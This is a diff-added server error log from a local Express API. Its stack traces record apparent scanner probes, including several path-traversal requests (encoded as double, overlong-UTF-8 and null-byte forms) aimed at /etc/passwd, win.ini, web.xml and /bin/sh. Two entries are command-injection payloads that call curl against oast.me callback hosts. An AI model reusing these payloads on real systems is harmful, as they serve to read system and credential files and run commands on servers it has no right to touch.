+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http://cham252v5qds6kt99dq0y3s3n4hxaqz7j.oast.me+-H+%27User-Agent:+46nRXh%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http://cham252v5qds6kt99dq0puwb9zq6sxfpi.oast.me+-H+%27User-Agent:+46nRXh%27%7D;'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http://cham252v5qds6kt99dq0xij66x1435yp3.oast.me+-H+%27User-Agent:+46nRXh%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http://cham252v5qds6kt99dq0b65uyz93qk5k3.oast.me+-H+%27User-Agent:+46nRXh%27%7D;'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%u002e/WEB-INF/web.xml'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+SyntaxError: Unexpected token @ in JSON at position 0
+    at JSON.parse (<anonymous>)
+    at createStrictSyntaxError (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:160:10)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:83:15)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+SyntaxError: Unexpected token u in JSON at position 1
+    at JSON.parse (<anonymous>)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:89:19)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
+URIError: Failed to decode param '/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%u002e/WEB-INF/web.xml'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae/%c0%ae/WEB-INF/web.xml'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae/WEB-INF/web.xml'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
